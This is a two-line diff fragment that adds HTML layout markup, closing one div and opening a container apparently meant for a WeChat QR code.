+                                                    </div>
+                        <div class="wechatcodeDiv">
